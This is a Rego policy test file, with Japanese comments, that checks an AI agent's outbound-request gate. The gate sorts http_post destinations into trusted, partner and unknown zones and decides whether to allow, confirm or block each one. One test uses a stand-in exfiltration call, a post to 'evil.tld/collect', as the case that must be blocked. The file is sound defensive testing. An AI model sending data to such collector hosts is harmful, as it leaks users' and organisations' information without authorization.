package agent_test

import data.agent

# 固定フィクスチャ（test_で始めない・data全体は差し替えない）
fixture_destinations := {
	"TRUSTED": ["https://www.yourcorp.jp", "https://api.yourcorp.jp"],
	"PARTNER": ["https://partner.example/"],
}

fixture_budget := 7

test_trusted_allow {
	in := {"steps": [{"tool": "http_post", "args": {"url": "https://www.yourcorp.jp/submit", "data_class": "LOW"}}]}
	r := agent.gate_decisions[_] with input as in
		with data.destinations as fixture_destinations
		with data.risk_budget as fixture_budget
	r.zone == "TRUSTED"
	r.data_class == "LOW"
	r.risky == false
	r.gate == "ALLOW"
}

test_partner_confirm {
	in := {"steps": [
		{}, {},
		{"tool": "http_post", "args": {"url": "https://partner.example/submit", "data_class": "HIGH"}},
	]}
	r := agent.gate_decisions[_] with input as in
		with data.destinations as fixture_destinations
		with data.risk_budget as fixture_budget
	r.zone == "PARTNER"
	r.data_class == "HIGH"
	r.gate == "CONFIRM"
}

test_unknown_block {
	in := {"steps": [{"tool": "http_post", "args": {"url": "https://evil.tld/collect", "data_class": "LOW"}}]}
	r := agent.gate_decisions[_] with input as in
		with data.destinations as fixture_destinations
		with data.risk_budget as fixture_budget
	r.zone == "UNKNOWN"
	r.gate == "BLOCK"
}

# 認知シグナル（HIGH WARN）で risky:true になること
test_partner_warn_risky {
	in := {"steps": [{}, {"tool": "http_post", "args": {"url": "https://partner.example/submit", "data_class": "LOW"}}]}
	warns := [{
		"step": 1,
		"severity": "HIGH",
		"reason": "Authority cue present",
	}]
	r := agent.gate_decisions[_] with input as in
		with data.destinations as fixture_destinations
		with data.risk_budget as fixture_budget
		with data.agent.policy.warn as warns
	r.zone == "PARTNER"
	r.risky == true
	r.gate == "CONFIRM"
}

test_summary_has_keys {
  in := {"steps": [{"tool":"http_post","args":{"url":"https://partner.example/submit","data_class":"LOW"}}]}
  warns := [{"step":0,"severity":"HIGH"}]
  s := agent.summary
       with input as in
       with data.destinations as {"TRUSTED":["https://www.yourcorp.jp","https://api.yourcorp.jp"],"PARTNER":["https://partner.example/"]}
       with data.risk_budget as 7
       with data.agent.policy.warn as warns
  s.risk_score == 3
  s.over_budget == false
  count(s.decisions) == 1
  count(s.explain) == 1
}
